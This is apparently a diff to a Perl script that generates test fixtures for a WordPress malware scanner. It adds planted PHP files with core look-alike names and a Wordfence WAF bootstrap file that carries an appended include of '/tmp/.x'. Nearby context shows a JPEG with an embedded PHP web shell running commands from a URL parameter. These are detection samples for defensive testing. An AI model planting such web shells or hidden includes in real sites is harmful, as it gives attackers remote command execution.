@@ -109,6 +109,20 @@ w('wp-content/uploads/2026/10/appended-big.jpg', $jpg . ("\x00" x 400000) . '<?p
 # PHP in EXIF/comment block right after the JPEG header
 w('wp-content/uploads/2026/10/exif-php.jpg', "\xff\xd8\xff\xfe\x00\x1c<?php system(\$_GET[1]); ?>" . ("\x00" x 400000) . "\xff\xd9");
 
+# ROOT_PHP_UNKNOWN: two tiny WP roots (wp-settings.php + wp-includes/)
+for my $r ('wproot', 'wproot2') {
+  w("$r/wp-settings.php", $P); w("$r/wp-includes/version.php", $P);
+  w("$r/index.php", $P); w("$r/wp-login.php", $P); w("$r/wp-content/index.php", $P);
+}
+w('wproot/index2.php', $P . 'echo "planted file";' . "\n");
+w('wproot/wp-confg.php', $P . 'echo "core look-alike name";' . "\n");
+w('wproot/wp-content/hidden.php', $P . 'echo "planted in wp-content";' . "\n");
+my $wfwaf = "<?php\n// Before removing this file, please verify the PHP ini setting `auto_prepend_file` does not point to this.\n\n"
+  . "if (file_exists(__DIR__.'/wp-content/plugins/wordfence/waf/bootstrap.php')) {\n"
+  . "\tdefine(\"WFWAF_LOG_PATH\", __DIR__.'/wp-content/wflogs/');\n"
+  . "\tinclude_once __DIR__.'/wp-content/plugins/wordfence/waf/bootstrap.php';\n}\n";
+w('wproot/wordfence-waf.php', $wfwaf);
+w('wproot2/wordfence-waf.php', $wfwaf . '@include "/tmp/.x";' . "\n");
 
 # ---------------- known false positives: must stay quiet/ignored ----------------
 w('legit/php/hex-lookup-table.php', $P .
@@ -146,3 +160,5 @@ w('legit/img/png-named-jpg.jpg', $png);
 w('legit/img/short-tag-bytes.jpg', $jpg . "\x10<?=\x7f" . $jpg);
 w('legit/img/svg-named-png.png', '<svg preserveAspectRatio="none" width="100%" height="100%" overflow="visible" style="display:block" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h8v8z" fill="#123"/></svg>' . "\n");
 w('legit/img/svg-embedded-png.png', $svg . '<image xlink:href="data:image/png;base64,iVBORw0KGgo=" width="8" height="8"/></svg>' . "\n");
+w('wproot/wp-content/object-cache.php', $P . '// drop-in' . "\n");
+w('wproot/wp-config.php', $P . '// config' . "\n");
